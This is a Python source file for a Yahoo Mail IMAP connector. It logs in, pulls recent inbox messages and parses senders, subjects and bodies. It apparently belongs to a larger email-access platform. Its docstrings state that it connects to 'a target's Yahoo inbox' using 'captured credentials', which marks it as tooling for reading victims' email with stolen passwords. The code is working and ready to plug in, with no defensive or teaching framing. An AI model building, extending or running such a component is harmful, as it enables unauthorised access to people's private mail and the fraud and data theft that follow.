"""
Yahoo Mail connector via IMAP (imaplib).

Connects to imap.mail.yahoo.com:993 with TLS using captured credentials
(app password or direct password). All blocking IMAP calls are run in
asyncio.to_thread() to avoid blocking the event loop.
"""
import asyncio
import imaplib
import email
from email.header import decode_header
from typing import List, Dict, Any, Optional

from app.services.email.base import BaseEmailService
from app.core.logging import get_logger

log = get_logger("services.yahoo")


class YahooService(BaseEmailService):
    """
    Connects to a target's Yahoo inbox via IMAP.

    credentials_data expects:
        - username: str (Yahoo email address)
        - password: str (app password or captured credential)
    """

    IMAP_HOST = "imap.mail.yahoo.com"
    IMAP_PORT = 993

    def __init__(self, credentials_data: Dict[str, Any]) -> None:
        super().__init__(credentials_data)
        self.username: str = credentials_data.get("username", "")
        self.password: str = credentials_data.get("password", "")
        self._conn: Optional[imaplib.IMAP4_SSL] = None

    async def authenticate(self) -> bool:
        """Establish IMAP connection and login."""
        if not self.username or not self.password:
            log.warning("Yahoo auth failed — missing username or password")
            return False

        try:
            self._conn = await asyncio.to_thread(self._connect_and_login)
            log.info(f"Yahoo IMAP authenticated for {self.username}")
            return True
        except imaplib.IMAP4.error as exc:
            log.error(f"Yahoo IMAP auth failed for {self.username}", extra={"error": str(exc)})
            return False
        except Exception as exc:
            log.error(f"Yahoo connection error", extra={"error": str(exc)})
            return False

    async def fetch_recent_messages(self, limit: int = 10) -> List[Dict[str, Any]]:
        """Fetch recent unseen INBOX messages."""
        if not self._conn:
            authenticated = await self.authenticate()
            if not authenticated:
                return []

        try:
            messages = await asyncio.to_thread(self._fetch_imap, limit)
            log.info(f"Fetched {len(messages)} messages from Yahoo for {self.username}")
            return messages
        except imaplib.IMAP4.error as exc:
            log.error("Yahoo IMAP fetch error", extra={"error": str(exc)})
            return []
        except Exception as exc:
            log.error("Yahoo fetch failed", extra={"error": str(exc)})
            return []

    async def disconnect(self) -> None:
        """Close IMAP connection gracefully."""
        if self._conn:
            try:
                await asyncio.to_thread(self._conn.logout)
            except Exception:
                pass
            self._conn = None

    # ------------------------------------------------------------------
    # Blocking IMAP internals (run via asyncio.to_thread)
    # ------------------------------------------------------------------
    def _connect_and_login(self) -> imaplib.IMAP4_SSL:
        """Establish SSL IMAP connection and login."""
        conn = imaplib.IMAP4_SSL(self.IMAP_HOST, self.IMAP_PORT)
        conn.login(self.username, self.password)
        return conn

    def _fetch_imap(self, limit: int) -> List[Dict[str, Any]]:
        """Fetch messages from INBOX via IMAP (blocking)."""
        self._conn.select("INBOX")

        # Search for recent messages — try UNSEEN first, fall back to ALL
        status, data = self._conn.search(None, "UNSEEN")
        if status != "OK" or not data[0]:
            status, data = self._conn.search(None, "ALL")

        if status != "OK" or not data[0]:
            return []

        msg_ids = data[0].split()
        # Take the most recent N messages
        recent_ids = msg_ids[-limit:]

        results = []
        for msg_id in reversed(recent_ids):
            parsed = self._fetch_single(msg_id)
            if parsed:
                results.append(parsed)

        return results

    def _fetch_single(self, msg_id: bytes) -> Optional[Dict[str, Any]]:
        """Fetch and parse a single email by IMAP sequence number."""
        try:
            status, data = self._conn.fetch(msg_id, "(RFC822)")
            if status != "OK" or not data[0]:
                return None

            raw_email = data[0][1]
            msg = email.message_from_bytes(raw_email)

            sender = self._decode_header(msg.get("From", ""))
            subject = self._decode_header(msg.get("Subject", ""))
            body = self._extract_body(msg)

            return {
                "id": msg_id.decode("utf-8", errors="replace"),
                "sender": sender,
                "subject": subject,
                "body": body,
            }
        except Exception as exc:
            log.warning(f"Failed to parse Yahoo message {msg_id}", extra={"error": str(exc)})
            return None

    def _decode_header(self, value: str) -> str:
        """Decode MIME-encoded email header value."""
        decoded_parts = decode_header(value)
        result = []
        for part, charset in decoded_parts:
            if isinstance(part, bytes):
                result.append(part.decode(charset or "utf-8", errors="replace"))
            else:
                result.append(part)
        return " ".join(result)

    def _extract_body(self, msg: email.message.Message) -> str:
        """Extract text body from email message, preferring plain text."""
        if msg.is_multipart():
            text_body = ""
            html_body = ""
            for part in msg.walk():
                content_type = part.get_content_type()
                content_disposition = str(part.get("Content-Disposition", ""))

                if "attachment" in content_disposition:
                    continue

                try:
                    payload = part.get_payload(decode=True)
                    if payload is None:
                        continue
                    charset = part.get_content_charset() or "utf-8"
                    decoded = payload.decode(charset, errors="replace")

                    if content_type == "text/plain":
                        text_body = decoded
                    elif content_type == "text/html":
                        html_body = decoded
                except Exception:
                    continue

            return text_body or html_body
        else:
            try:
                payload = msg.get_payload(decode=True)
                if payload:
                    charset = msg.get_content_charset() or "utf-8"
                    return payload.decode(charset, errors="replace")
            except Exception:
                pass
            return ""
